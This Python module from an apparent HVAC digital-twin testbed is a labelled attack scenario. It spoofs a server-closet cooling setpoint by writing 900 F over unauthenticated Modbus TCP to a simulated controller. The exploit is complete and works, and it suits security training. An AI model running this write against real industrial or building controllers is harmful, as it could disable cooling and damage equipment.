"""Attack scenario #1 (flagship): setpoint spoofing against the server
closet.

Connects to a live hvac_twin controlled-closet instance -- started with
`python -m hvac_twin.live_runner examples/server_closet_controlled.toml`
-- over plain, unauthenticated Modbus TCP and writes an inflated cooling
setpoint. This needs no new DigiTwin plumbing: the slave server has no
concept of authentication, so this is the exact write
test_server_closet_modbus.py's second test already proved works, packaged
so it can be run against a live twin instead of driven from a test.

    uv run python -m hvac_twin.attacks.setpoint_spoof --setpoint 900

Address 0 is setpoint_tenths's *accept* register, not its publish one --
see examples/server_closet_controlled.toml's [modbus.slave_server]
comment for why the closet uses two addresses for the same tag.
"""

from __future__ import annotations

import argparse
from typing import Any

from hvac_twin.attacks._client import wait_for_connection

_SETPOINT_ACCEPT_ADDRESS = 0


def spoof_setpoint(host: str, port: int, setpoint_f: float) -> str:
    """Write an inflated cooling setpoint to a live twin's accept register
    over plain Modbus TCP. Returns a human-readable summary; raises
    ConnectionError/RuntimeError rather than exiting the process, so this
    is safe to call from a long-running console, not just a one-shot CLI."""
    from pymodbus.client import ModbusTcpClient

    setpoint_tenths = round(setpoint_f * 10)
    client: Any = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        wait_for_connection(client, host, port)
        result = client.write_registers(
            address=_SETPOINT_ACCEPT_ADDRESS, values=[setpoint_tenths], device_id=1
        )
        if result.isError():
            raise RuntimeError(f"write failed: {result}")
        return (
            f"spoofed setpoint_tenths -> {setpoint_tenths} ({setpoint_f:.1f} F) "
            f"at {host}:{port}, no authentication required"
        )
    finally:
        client.close()


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument(
        "--setpoint",
        type=float,
        default=900.0,
        help="spoofed setpoint in degrees F (default: 900, i.e. 'never cool')",
    )
    args = parser.parse_args(argv)

    try:
        print(spoof_setpoint(args.host, args.port, args.setpoint))
    except (ConnectionError, RuntimeError) as exc:
        raise SystemExit(str(exc)) from exc


if __name__ == "__main__":
    main()
